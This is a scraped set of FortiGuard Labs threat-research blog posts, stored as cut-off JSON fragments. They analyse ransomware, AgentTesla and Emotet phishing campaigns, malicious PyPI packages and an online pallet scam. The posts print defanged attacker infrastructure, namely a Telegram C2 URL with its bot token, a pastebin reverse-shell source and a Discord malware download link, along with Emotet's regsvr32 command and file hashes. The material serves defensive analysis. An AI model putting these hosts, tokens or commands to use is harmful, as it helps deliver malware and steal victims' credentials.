notable exceptions, like the popular F5 BIG-IP iControl CVE-2022-1388 and VMware Workspace ONE Access CVE-2022-22954 vulnerabilities. Data from our telemetry also verifies that even old vulnerabilities from 2014 are still being actively exploited. Mirai and Gafgyt-based malware still dominate the IoT threat landscape in terms of the sheer volume of samples. There is also a growing variety of malware written in the Go programming language, possibly fueled by the increasing availability of malware source code in public repositories like GitHub, which makes it easy for unsophisticated threat actors to build and operate their own botnets. With this increased interest in using Golang for malware development, we expect to see even more Golang IoT botnets this year. FortiGuard Labs will continue to track and report on emerging threats and trends in the IoT threat landscape. The FortiGuard Antivirus service detects and blocks these threats as TheFortiGuard AntiVirusservice is supported byFortiGate,FortiMail,FortiClient, andFortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. FortiGuard Labs provides IPS signatures against the following vulnerabilities.

    "title": "Ransomware Roundup – Monti, BlackHunt, and Putin",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-monti-blackhunt-and-more",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and across the OSINT community. The Ransomware Roundup report provides brief insights into the evolvingransomwarelandscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers Monti, BlackHunt, and Putin ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Monti is a relatively new ransomware designed to encrypt files on Linux systems. Files encrypted by Monti ransomware have a \".puuuk” file extension. We are also aware of reports of potential Monti variants that work on Windows systems. Monti drops a ransom note titled “README.txt”. This ransom note resembles that of the infamous Conti ransomware. Unlike typical ransomware, the Monti threat actor operates two separate TOR sites: one for hosting data stolen from victims and another for ransom negotiation. At the time of writing, the ransom negotiation site was not accessible. Thedata leaksite has a “wall of shame,” which the Monti operator may have copied from other ransomware gangs such as Ragnar Locker. Currently, the leak site does not list any victims but has a provocative message that may indicate that many victims of Monti ransomware were “cooperative” and paid ransom, except for one victim in Argentina. The ransomware also drops a text file titled “result.txt”, which shows how many files it has encrypted in the compromised machine. FortiGuard Labs recently came across new variants of the BlackHunt ransomware. This ransomware is relatively new and reportedly accesses victims’ networks through vulnerable Remote Desktop Protocol (RDP) configurations. Files encrypted by BlackHunt ransomware can be identified with the following filename pattern:  [unique ID assigned to each compromised machine].[contact email address].Black. The ransomware also deletes shadow copies, which makes file recovery difficult. The ransomware also drops two ransom notes: one is titled “#BlackHunt_ReadMe.hta” and the other is “#BlackHunt_ReadMe.txt”. Although both ransom notes belong to BlackHunt ransomware, the notes not only include different contact email addresses but the different IDs assigned to each victim as well. The ransom note in HTA format also has a link to a TOR site, which was no longer accessible at the time of the investigation. Putin is a recent ransomware that encrypts files on victims’ machines. It then tries to extort money for decrypting those files and not leaking stolen data to the public. Files encrypted by Putin ransomware have a “.PUTIN” file extension. The ransomware drops a ransom note titled “README.txt”, which states that victims have only two days to make a ransom payment. Otherwise, their encrypted files will not be recovered. This is a common tactic used by many ransomware variants to put pressure on victims to pay a ransom as fast as possible. The ransom note includes two Telegram channels: one for negotiating ransom payment with the Putin ransomware gang and another for releasing data stolen from the victims. At the time of the investigation, the channel used for data leaks lists a Singapore and a Spanish company. However, the dates of the posts only go back to late November 2022, indicating that the Putin ransomware is likely not yet widespread. Fortinet customers are already protected from this malware variant through FortiGuard’s AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known Monti, BlackHunt and Putin ransomware variants with the following AV signatures: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "title": "Trying to Steal Christmas (Again!)",
    "link": "https://www.fortinet.com/blog/threat-research/trying-to-steal-christmas-again",
    "content": "FortiGuard Labs Threat Research Much of the world’s population observes and celebrates Christmas every December to connect with friends and family and reflect on the year. Malware operators also observe the holiday, perennially attempting to compromise the systems of users who have let their guard down during the festivities. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Malware opens a backdoor and exfiltrates information from compromised machinesSeverity Level:High FortiGuard Labshas come across two holiday-themed phishing examples that exploit people’s interests in the holidays, leading to malware infection and further exploitation. FortiGuard Labs found that an AgentTesla affiliate started Christmas activities early this year. Their email is disguised to look like it came from a jewelry shop in Dubai. It was sent to a company that specializes in water treatment in Chile. The email requests that the recipient provide quotes for the price and availability of jewelry for Christmas. An obvious red flag is that “Dubai” is spelled wrong (besides asking a company specializing in water treatment for jewelry pricing.) The email has two attachments: “new designs.gz” contains “new designs.exe,” and “Inquiry lists.gz” contains “Inquiry lists.exe.” Although the embedded files have different names, they share the same file hash (SHA2: c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5). When executed, c94eac21e05336aa64ccbc1726d0a2961880627973dae4c5483aaed33150eec5 drops fkkvzetzm.exe, jfwxswcu.au3, igqyivch.prc, and kywyozha.x into the %usertemp% directory. It then calls an AutoIt script (jfwxswcu.au3) by launching fkkvzetzm.exe (a legitimate copy ofAutoIt3) with jfwxswcu.au3 as an argument. The file jfwxswcu.au3 is an obfuscated AutoIt script designed to read and deobfuscate igqyivch.prc, which contains shellcode. The shellcode is then loaded into memory via VirtualAlloc. The shellcode, in turn, loads kywyozha.x into memory. Once loaded, kywyozha.x performs several tasks, including launching a copy of the running process and checking to see if it’s running inside a 64bit process. To avoid being detected by system monitors such as AV and EDR, it copies ntdll.dll into memory so it can use that instead of the one on the disk. It then checks to see if specific APIs in ntdll.dll have been modified or hooked withtrampolines. It then finally injects kywyozha.x into the copy of the running process. The file kywyozha.x is an executable file. It calls itself 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe (SHA2: 0FCAE5DB73D10B022E86F7E0799073623FA5063A29054807E1F93A4016D8FC99). 8845e90c-374f-4f68-a7a8-4bc7bad7be20.exe is a variant of the AgentTesla infostealer Trojan that uses Telegram (hxxps://api.telegram[.]org/bot5018340186:AAFKw8ktzY7O_6e1fhgEWq27H2aE-rsBGjA/) for its Command-and-Control (C2) server. The malware can download and delete files, steal credentials from browsers and FTP and email applications, and performkeylogging Fortunately, the company that received the email is not in the jewelry business and is unlikely to have opened and executed AgentTesla. We also recently came across a strange email with a theme familiar to Christmas movie viewers. The email was crafted to appear as being sent from Klaus Hans Gruber to John McClane - fictional characters from the original Die Hard movie. The email has a heartfelt message requesting to settle their long-time feud and asks the recipient (in this case John McClane) to open the attachment, “good_time.zip.” The archive file contains a series of what appear to be JPEG image files. However, a closer look revealed that “image6” is not actually a JPEG file. Rather than a photo, image6 is a batch file that displays “image7.jpg.jpg” (shown below) and also loads and executes PowerShell code from hxxps://pastebin[.]com/raw/PeJLUFC4. While these PowerShell commands claim to be for “educational purposes,” they create a reverse shell backdoor to the email sender. This backdoor allows for the execution of arbitrary PowerShell commands. The obvious tactic used by the attacker is to get the recipient to go through a set of amusing images attached to the email and inadvertently run the malicious batch file. While the email is crafted as a joke, the attachment can still cause real harm to users by opening a backdoor on compromised machines. While the attacks covered in this blog are not new by any means, such attacks are repeated every year because threat actors believe that “if you take enough shots, you will eventually make a basket.” That’s especially true when attacks exploit things like holidays and major events, like Christmas or the World Cup. Taking advantage of distracted recipients continues to be a successful strategy, and users are cautioned to remain vigilant during the holiday season. To that end, the Cybersecurity and Infrastructure Security Agency (CISA) has created several tips to help users with online safety and handling email attachments. FortiGuard Labs wishes everyone a safe holiday season! The Fortinet Antivirus engine detects all binaries discussed in this blog using the following AV signatures: The FortiGuard Web Filtering service rates the AgentTesla C2 server and the location where malicious PowerShell script is hosted as ‘Malicious’ and blocks them accordingly. FortiMail and FortiSandbox can detect and quarantine the malicious attachments in this campaign, and Fortinet’s CDR (Content Disarm and Reconstruction) service can disable them. In addition to these protections, Fortinet can help train users to understand and detect phishing threats: Our FREENSE trainingprogram—NSE 1 – Information Security Awareness—includes a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. threat research,FortiGuards Labs,email threats,holiday FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc.

    "content": "FortiGuard Labs Threat Research On a bi-weekly basis,FortiGuard Labsgathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Play ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Play is a relative newcomer to the ransomware game, having been detected for the first time in June 2022. In this report, Play refers to both the group developing and distributing it and the name of the ransomware executable. Like many other operators in this space, Play has adopted the double-extortion methodology of encrypting endpoints and/or other infrastructure of value within an organization and then threatening to release exfiltrated data from those machines on the internet if a ransom is not paid. Play has been seen to use a number of common methods to gain access to an environment, including phishing, valid compromised accounts, and exposed RDP (Remote Desktop Protocol) servers. Once a beachhead has been established, LOLBINS (Living Off the Land Binaries) are used to explore and then prepare the ground to execute malware on machines of interest. The ransomware executable is Microsoft Visual C++ based and contains several anti-debugging and anti-analysis features to slow investigations into the activity of the malware. These features include garbage code (untethered instructions that serve no useful purpose) and function returns that drive execution into a dead end. When launched, the ransomware encrypts all files of interest, such as personal and operational documents (it does not touch system files), and leaves them with a “.PLAY” extension. When encryption is complete, a ransom note named “ReadMe.txt” is added to the root of the primary drive (e.g., C:\\). This note contains a link to the group’s TOR pages and a contact e-mail address. The “Play News” landing page lists the companies allegedly impacted by Play and a countdown to the possible release of any data gathered by them. Organizations that have refused to pay also have links to their data posted here. There is also a contact portal where the group can be reached, an “FAQ” section that broadly describes what the group has done, and steps for victims to take to restore their data. As of this writing, the “Play News” page lists seven active victims currently being threatened. The regional breakdown of the victims is below: The regional breakdown of victims whose stolen data was leaked is as follows: Based on this information, the Play ransomware threat actors appear to target victims regardless of their region. The one caveat is that enterprises in former Soviet states do not appear to be listed on “Play News”, although this may be coincidental. Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Play ransomware variants with the following AV signatures: File-based IOCs: SHA256 f18bc899bcacd28aaa016d220ea8df4db540795e588f8887fe8ee9b697ef819f e641b622b1f180fe189e3f39b3466b16ca5040b5a1869e5d30c92cca5727d3f0 608e2b023dc8f7e02ae2000fc7dbfc24e47807d1e4264cbd6bb5839c81f91934 006ae41910887f0811a3ba2868ef9576bbd265216554850112319af878f06e55 e4f32fe39ce7f9f293ccbfde30adfdc36caf7cfb6ccc396870527f45534b840b 8962de34e5d63228d5ab037c87262e5b13bb9c17e73e5db7d6be4212d66f1c22 5573cbe13c0dbfd3d0e467b9907f3a89c1c133c774ada906ea256e228ae885d5 f6072ff57c1cfe74b88f521d70c524bcbbb60c561705e9febe033f51131be408 7d14b98cdc1b898bd0d9be80398fc59ab560e8c44e0a9dedac8ad4ece3d450b0 dcaf62ee4637397b2aaa73dbe41cfb514c71565f1d4770944c9b678cd2545087 f5c2391dbd7ebb28d36d7089ef04f1bd9d366a31e3902abed1755708207498c0 3e6317229d122073f57264d6f69ae3e145decad3666ddad8173c942e80588e69 dd101db5d9503f33a0c23d79da3642e999375748f7c1532e98c813b114bdfa1a 47c7cee3d76106279c4c28ad1de3c833c1ba0a2ec56b0150586c7e8480ccae57 703075181922eb8db8d23279eaed8f7263dfa2b64383cff675da4cedc2394af5 f39d6741cbb99a81decbe5e75c07e846b5a36b40bc1bb0c0c61415300cc43b6c 8d94028bfaac5bef84c56b01f40e429ae4cdf799b2b755dfba9eee3b72448b5b f0a3047e9d557e2150501e302d5e96a1c2669858fb0072f97024fe0dd07d5271 8556dfe5582a5647a5e96cd77e6239874504a01a9c7b9e512e70329ec6f61aea 5e94626c6bcb825acede3826811ed693644d6dbb7caeeefb8575c2ec711a65a6 a29e20d89e8c933e05b690b2779f82716fb31f688594b99d868e4382058caa8f 757524b09e5d4f2399172c4ac0f6996ec34dec90110542973d438d5370aff280 3a36e917a4a6587290a393d5b10d0bd42f99cf0c72a2e7de751a4bfaeb9d30c5 92f3abed62d710064a19f2a50c4482cd02adfd821ace4c2f3030f96290166189 157c43a3a4e014827e42cf4dd20cc8efa71cdf098f5d1d04b6cd1a972d6a8c7a 5eca08ddca898427de5ab13fedf25426102c3a0621d086b63f2e37d2d04ba3e9 2b4111121fb35b46665c42e3ea2cf1b8eda5afce580e310465cb259bb1abd053 12d1a0dc37d877dbf81bd18e8bd57b2843cc254c9a3cfcbecb70305612e60cae bb51255ec929ae1fb34981b8b988769027ee49e68c0958a4a2a76b59a0dc1cff 51f44e31b0f3718a5d145a1f77fd79cbd7ff21fecf8bba3181fea019b508cfeb 73e19be4da76bb4e52cb82493c75690977fc3a5f589a9b47e834362545ef512a bbd84d10f6a56bfeca23fd5d11d9e370fdfa91be73aa60c9d460b2671145c109 0ed328af77f2576071bfd543938fc01101daac01f216dc43bc091a8da4aff18d f054f373cead893f868fd9b4acc24f751afefbb80cf961e305f97741f952a641 176476f9d924d83343a51a90ade097d12b7594dc5dbca1771c440047dfbe81eb 957a6aee2437a5c4d31372af2f6bceb29e1c7a49d650fe207cefc624bf6bca82 2e9126dfad03bdaf54f9b29ade42038c83f65ac7288376f45768901660f62d7b 2ab190542c3ec7b2b6e6d4bccce4c5d6a572f98c6bc89b014fea0c8fd6db6723 Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release ofpersonally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises).

    "title": "The Taxman Never Sleeps",
    "link": "https://www.fortinet.com/blog/threat-research/the-taxman-never-sleeps",
    "content": "FortiGuard Labs Threat Research For most people, taxes are a certainty. In the United States and Canada, tax forms are usually submitted by individuals and businesses in the spring (although, due to COVID,extensions were grantedfor anyone that asked for them). So, our interest was piqued when we came across an e-mail that included a tax form seemingly from the United States Internal Revenue Service (IRS) in early November. Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium The e-mailFortiGuard Labsdiscovered was, unsurprisingly, malicious. But whatwasinteresting was that it had been sent by the recently resurgent Emotet group. Emotet (aka, Geodo and Heodo) began life as a banking Trojan but has since morphed into a jack-of-all-trades tool that can exploit several vulnerabilities to compromise its victims. Once it has infected a system, it then typically delivers additional payloads. And because it’s modular, it is easily customizable by its users. This flexibility and resiliency are part of why Emotet has managed to survive at least one coordinated industry/law enforcement takedown in 2021. Although claiming to be from “IRS.gov,” this phishing e-mail originated from an organization’s compromised e-mail account in Pakistan. The subject and body claim that the recipient’s IRS K-1 forms are attached in a Zip archive encrypted with the password “0440”. Schedule K-1is a US federal tax document that reports income, losses, and dividends for a business or financial entity's partners or an S corporation's shareholders to the IRS. Because the content from these forms must be added to an individual’s annual tax form, they must be submitted one month prior (March 15) to the individual income tax submission deadline of April 15. This is why seeing a Schedule K-1 form attached to an email on November 8th was a red flag. A Zip archive, “K-1 form.zip”, and an image of the IRS logo are attached to the email. This “K-1 form.zip” file is an encrypted Zip archive that requires a password to unpack. Its password, “0440”, is included in the body of the e-mail. It allows the “K-1 form.xls” to be opened. Once opened, the file is an Excel spreadsheet with an interesting banner. It exhorts the user “in accordance with the requirements of your security policy” to copy the file into the “Templates” directory of whichever version of Microsoft Office is being used and then relaunching the file. The file has several worksheets (seven in total). Six of those sheets are protected, so they can’t be changed, and the user cannot view their contents directly. As you might suspect, this spreadsheet includes a malicious Excel 4.0 macro. An entry in “Manage Names”—“Excel_BuiltIn_Auto_Open”—is set to execute a command in a cell in the only sheet in the workbook that isn’t protected. A deeper look at Sheet6 shows that column “G” has been hidden. Python scripting reveals more information about how this malicious file functions. Using the Python library “openpyxl”, we could view details hidden in each of the worksheets. As shown inFigure 6, several rows and columns have hidden content. For example, by drilling deeper into the data for “Sheet4,” several URL fragments are revealed. Some further scripting helps piece these fragments together. This reveals four possible download locations for the next stage payload. Depending on which URL is used, the downloaded payload is saved as oxnv1.ooccxx through oxnv4.oocccxx. It then calls and attempts to launch this payload via “regsvr32.exe” using the command “C:\\Windows\\System32\\regsvr32.exe /S ..\\oxnv[n].ooccxx”. This executable is Emotet. The Emotet payload is a Windows Dynamic Link Library (DLL) file. Our analysis shows that it was compiled just before the email for this campaign was sent out. Unusually, this DLL has over 270 export functions! As can be seen in Figure 11, the function names are randomized. The vast majority offer a return to the caller. This appears to be an anti-analysis/anti-debugging method. When executed, “oxnv[n].ooccxx” is copied to a randomly named directory under “C:\\Windows\\System32” and then renamed to an equally random name. The regsvr32.exe process is restarted to use the renamed file in its new location. Once Emotet is up and running, it attempts to contact one of its Command and Control (C2) server nodes. In this case, 20 possible IPs are used (shown in the IOC section below). The malware loops through each sequentially until contact is made. If the attempts are unsuccessful, it pauses and then cycles through again for as long as required. The spectre of the IRS is not a new phishing lure, especially during tax season. Even though the IRS will never initiate contact with taxpayers by email, few things motivate recipients to act (and, as a result, be less cautious) than thinking the IRS has contacted them. This threat is especially interesting because it was delivered outside the usual time frame for tax-based phishing. It is also a warning that when you receive an unusual email like this, it is best to treat it with caution because Emotet and other similar threat actors will be hoping that fear will cause caution to be abandoned. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signatures detect the malware samples mentioned in this blog MSExcel/Agent.DKF!tr.dldr W32/Emotet.PACA!tr The WebFiltering client blocks all network-based URIs. Fortinet has multiple solutions designed to help train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. In addition to these protections, we suggest that organizations have their end users undergo our FREENSE training:NSE 1 – Information Security Awareness.

    "title": "New Supply Chain Attack Uses Python Package Index “aioconsol”",
    "link": "https://www.fortinet.com/blog/threat-research/new-supply-chain-attack-uses-python-package-index-aioconsol",
    "content": "FortiGuard Labs Threat Research Our team has discovered another 0-day attack embedded in a PyPI package (Python Package Index). This one is called “aioconsol.” It was found on December 9, 2022, by monitoring an open-source ecosystem. This Python package was published on December 6, 2022, as shown in its official PyPI repository. As can be seen, all three versions of this malware were published on the same day. Like the “shaderz” zero-day PyPI attack wediscovered and postedlast week, this malicious package does not include a clear description of its project or source page. Version 2.0 of the package includes malicious code in its setup.py installation script that writes what appears to be a binary to a file called “test.exe” and executes it as a part of its installation. In the previous versions, 1.0 and 0.0, a similar malicious code appears in its __init__.py scripts, as shown below. As shown in the VirusTotal entry below, several vendors flag this binary exe as malicious (SHA 256): 52e6efbbfb1fdeb976e2464c542bc17747d213d67f28dff4d7df0879df23fd7e Let’s jump right into the binary exe and run it. It creates a subprocess called ‘stub.exe.’ It drops a series of files to the folder ‘%USER%\\AppData\\Local\\Temp\\onefile_%PID_%TIME%’, as shown below. This dropped executable ‘stub.exe’ is flagged as malicious by only a handful of vendors (SHA 256): 8124cec491e0249bc4a9f3f9d3755201b0e8c28068ce8c4b528217dbb94afd13 After we run test.exe, we see that it copies itself to ‘%USER%\\AppData\\Local\\WindowsControl’ as ‘Control.exe’ and drops a ‘run.bat’ batch file. The run.bat script shows the path to the file ‘Control.exe,’ which may be used to run it at startup. This is the second malicious zero-day Python Package Index (PyPI) supply chain attack we have discovered in less than a week. This technique is often used because malware authors can store an entire binary executable inside a simple python script. This can have drastic effects, potentially damaging your system and exposing users to vulnerabilities. Individuals and organizations need to be wary of installing python packages in the wild as they may include malware.

    "link": "https://www.fortinet.com/blog/threat-research/supply-chain-attack-via-new-malicious-python-package-shaderz-part-2",
    "content": "FortiGuard Labs Threat Research In this second part of our Shaderz zero-day analysis, we look closely at its downloaded executables. Refer toPart Oneof this blog for more background. To start, we found that this is a multi-stage attack: 1.     Stage one – Connect to a suspicious URL to download the executable ‘stub.exe’ using setup.py found in the package 2.     Stage two – ‘stub.exe’ downloads another executable called ‘main.exe’ 3.     Stage three – executing ‘main.exe’ As we look deeper into the first executable, ‘stub.exe’, we find that it is a 64-bit PyInstaller compiled executable (Python version 3.11). We observed key behaviors from the disassembled Python byte code of ‘stub.exe’ shown below. The ‘main.exe’ executable downloaded from URL hxxps://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe is saved to ‘%USER%\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\screen.scr’. It then runs the executable: We can also see it sets autorun for this downloaded executable at startup. The second downloaded executable is where the more malicious behavior happens. Similar toPart Oneof this blog, the download URL https://cdn[.]discordapp[.]com/attachments/1045000289708687390/1045158219024171169/main[.]exe includes the following binary exe (SHA 256): d1f0583169acde756793d7d5d69afbb72331c931a88749eab14f28ecda3ef5ce As with the previous executable, this download URL has not previously been detected by any other threat researchers. However, some vendors flag this downloaded executable file as malicious, as shown below. This executable is also a 64-bit PyInstaller compiled executable (Python version 3.11). As shown below, it uses a powerful Python obfuscator called Hyperion in its Python byte code. One suspicious behavior conducted by ‘main.exe’ is creating a series of text and DB files in the ‘%USERPROFILE%\\AppData\\Local\\Temp’ folder. It then stealthily records sensitive user data and credentials. When we look into any of these text files, we see that the malware names itself ‘Subliminal Stealer.’ Let’s take a look at the DB files below. We can safely assume that they are used for saving sensitive data and credentials, such as credit card and log-in information. Individuals need to be wary of installing python packages in the wild as they may have potential malicious behaviors hidden within. As this blog series demonstrates, malware authors are often able to use what seems like a benign package to prey on victims. We will continue monitoring new open-source packages and report malicious packages to help prevent users from becoming victims of a supply chain attack.

    "title": "Want to Know What’s in That Online Mystery Box? NOTHING AT ALL",
    "link": "https://www.fortinet.com/blog/threat-research/want-to-know-whats-in-that-online-mystery-box-nothing-at-all",
    "content": "FortiGuard Labs Threat Research The holidays are upon us, and in some parts of the world, the month of December (especially in North America) is when many retailers earn the bulk of their revenue. Because the holiday season includes gift giving and sales on desirable merchandise, individuals tend to spend more money than average. At the same time, retailers, small businesses, and mom-and-pop stores also spend more money to stock their shelves. Affected Platforms:N/AImpacted Parties:Online ShoppersImpact:Loss of personally identifiable information and/or moneySeverity Level:Low Because the online marketplace is so competitive, many online retailers offer free shipping and returns during this period. But with increased sales comes an increase in returns and exchanges. The volume of online returns has been increasing steadily over the past five years. Online returns jumped from10.6% in 2020 to 16.6% in 2021—an overall $761 billion dollar increase. This year, however, many online retailers have curtailed these benefits,citing inflation and lower profits. But despite this change, when combined with the sheer volume of sales in brick-and-mortar stores, the number of returns is still expected to rise. And rather than repackaging these items for resale, many returns are sent to logistic companies that bundle and sell them in bulk, often for pennies on the dollar. This has created a burgeoning second-hand market.  These outlets usually resell returns, overstocks, slightly damaged, and used items purchased in bulk from retailers nationwide, often at a steep discount. These stores provide a benefit for the consumer and the environment since many returned products otherwise often end up being incinerated or tossed into a landfill. Shoppers have been flocking to these new sites looking for great deals on holiday purchases. And as you might expect, scammers and bad actors have also seized on this trend. OurFortiGuard Labsteam has uncovered a growing number of scams related to the resale of used or returned items. The example below emphasizes the need to be cyber-aware this shopping season, whether you are purchasing something for yourself, a loved one, or your business. One common technique for reselling returned and overstocked items is to sell mystery items in large boxes or pallets. Social media is filled with videos showing excited consumers opening pallets that contain items of significant value, like iPhones and computers, that were purchased online for a few hundred dollars. These posts have contributed to the interest and frenzy. Many of these are scams. The sheer amount of interest, demonstrated by the volume of trending hashtags on social media, has created an opportunity for threat actors to try and capitalize on unknowing victims. One such scam seeing rapid growth is the Amazon pallet scam, also known as mystery boxes, bulk return pallets, etc. The following example is a paid advertisement we recently came across on the default Microsoft start page built into Windows 10: Clicking on the top left advertisement, “Amazon’s unclaimed high-end electronics mystery boxes are being sold at bar [sic],” takes us to the website fundelivereddss[.]com: The landing page appears convincing to the untrained eye, showing a large warehouse with brown boxes stacked on pallets: The viewer is then presented with an interstitial (an inserted web page that displays advertising) that highlights someone in “Conroe” who purchased a return tool pallet only a minute after visiting the site: Clicking on the interstitial brings us to the following page: The intended victim is presented with several options and brands to choose from, including size, quantity, and price: Typical red flags seen on scam sites are grammatical errors, typos, the misuse of punctuation and spacing, inconsistent logos, etc. This is often due to the fact that the scammers are trying to get their site online as fast as possible to start making money or that the bad actors are non-native English speakers. In this case, we can see that the phrase “Customer Review(40)” at the top of the pages is missing pluralization and does include a space between the word “Review” and the parentheses symbol: The first review also contains a fragmented and incoherent review that indicates that the writer is likely a non-native speaker: It's great to witness his arrival together at this moment. I recommend this store, please don't buy from other stores because I fell down in other places. Some forensics analysis of the photo shows it was taken from Twitter from an electrical contractor based in the United States: Another clue is that the domain fundelivereddss[.]com was only registered on October 29th.  Recently registered domains are often hallmarks of a potential scam, popping up and then disappearing in time with an event, such as the holidays or the World Cup. Threat actors also know that search engine ranking for their new site will be low, so they use social media promotion to get these sites in front of potential victims. Another clue we observed was found within the privacy policy page. It includes a reference to herbertm[.]shop. This indicates that this template was likely reused by the same actor. To test this theory, we visited herbertm[.]shop to see what it contains. This page appears to be selling fashion items. However, we also see a floating interstitial that appears to be the last chance to order what appears to be Amazon returns: When viewing the link, we found it contains Amazon and EBay references: Amazon and eBay backlog, picking, liquidation 【Temporary sale】 (herbertm[.]shop) https://www.herbertm[.]shop/products/products-amazon-and-ebay-backlog-picking-liquidation-temporary-sale?sales_pop=true&spm=..index.0.1 Unfortunately, when we clicked on the link, we found that the page no longer exists, so at this point we don’t have any evidence that this was another pallet scam. However, the pattern used in the herbertm[.]shop and Fundelivereddss[.]com sites and the cross-reference between the two in the privacy policy indicates these were set up by the same perpetrators. So we kept looking. While a Google cache disn’t provide us with any clues, looking at scamadviser.com revealed negative reviews from victims of herbertm[.]shop that make the connection clearer: It appears that some victims of the herbertm[.]shop scam site ordered large pallets as well as individual items. And it also appears from the complaints that some victims were offered a bait and switch. For example, some that had ordered a specific item only had a cheap unrelated item sent to them. And for the pallet scams, one victim stated they only received a video game controller instead of the pallet, and another claimed to have ordered two pallets for $89.98 but did not receive anything. Creating professional-looking websites has never been easier.  Many eCommerce platforms come preconfigured with design templates, shopping carts, and payment gateways. Because of this, sites can literally be online within moments. Gone are the barriers that required a retailer to know how to develop a website, figure out how to 